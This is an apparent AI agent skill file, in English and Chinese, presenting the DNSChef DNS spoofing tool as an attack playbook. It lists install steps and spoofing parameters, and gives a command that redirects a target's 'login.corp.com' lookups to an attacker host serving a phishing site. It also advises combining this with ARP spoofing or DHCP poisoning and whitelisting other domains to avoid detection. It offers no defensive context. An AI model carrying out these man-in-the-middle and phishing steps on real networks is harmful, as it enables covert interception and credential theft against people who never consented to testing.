---
name: dnschef-spoof
description: "DNSChef: targeted DNS hijacking. Signals: man-in-the-middle, MITM, redirect all domains to attacker, spoof only specified domains, real resolution whitelist."
zh-signals: "DNSChef: 定向域名劫持。信号:中间人,mitm,全域名指向攻击机,只伪造指定域,真实解析白名单。"
---

# DNSChef

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/iphelix/dnschef
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install dnschef 或 git clone
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `dnschef.py --fakeip 10.8.0.2 --interface 0.0.0.0` | 全域名指向攻击机 |
| `--fakedomains corp.com` | 只伪造指定域 |
| `--truedomains update.com` | 真实解析白名单 |
| `-q` | 静默 |

## 攻击场景 Playbook

### 定向域名劫持

```bash
sudo python dnschef.py --fakeip 10.8.0.2 --fakedomains login.corp.com -i 0.0.0.0
# 目标 DNS 指向本机后,其访问 login.corp.com 即入钓鱼站
```

## 注意事项

配合 ARP 欺骗或 DHCP 污染使用;--truedomains 保证其余域名正常解析降低暴露。
